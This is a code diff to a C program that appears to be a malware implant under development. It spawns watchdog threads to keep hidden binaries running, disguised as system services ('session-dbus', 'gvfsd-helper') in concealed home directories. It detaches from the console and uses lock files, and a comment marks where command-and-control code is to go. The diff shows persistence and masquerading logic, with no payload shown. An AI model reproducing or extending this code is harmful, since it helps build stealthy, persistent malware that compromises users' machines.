@@ -22,19 +22,21 @@ int main(int argc, char *argv[]) {
     // Spawn session-dbus (monitor)
     if (access("/home/gdev/.X11/X0-lock", F_OK) == 0) {
 
-        if (id != 0 ) { // non-root
-            //daemon(0, 0);
-            printf("initial spawn of session-dbus\n");
-            spawn_thread_watchdog(1, "/home/gdev/.dbus/.sessions/session-dbus");
-        }
-        do {
+        // if pwd , spawn session-dbus
+        if (get_pwd() == true) {
+            if (id != 0 ) { // non-root
+                //daemon(0, 0);
+                spawn_thread_watchdog(1, "/home/gdev/.gvfsd/.profile/gvfsd-helper");
+            }
+            do {
             // forever run session-dbus as a "watchdog process".
             sleep(10);
-        } while(true);
+            }while(true);
+        }
 
     } else {
         #ifdef DEBUG
-        fprintf(stderr, "First time running, creating lock!");
+        fprintf(stderr, "First time running, creating locks!!");
         #endif
         create_lock();  // lock file created, when gvfspd spawns session-dbus, the top loop will run forever.
     }
@@ -51,12 +53,12 @@ int main(int argc, char *argv[]) {
 
     } else { // non-root user....
 
-        daemon(0, 0);  // detach from current console
+        //daemon(0, 0);  // detach from current console
         // spawns -> /home/$USER/.gvfsd/.profile/gvfsd-helper
-        //printf("initial spawn of gvfsd-helper\n");
+        printf("initial spawn of gvfsd-helper\n");
         spawn_thread_watchdog(0, "/home/gdev/.gvfsd/.profile/gvfsd-helper");
-
         // Main C2 goes here?
+
     }
 
     #ifndef DEBUG
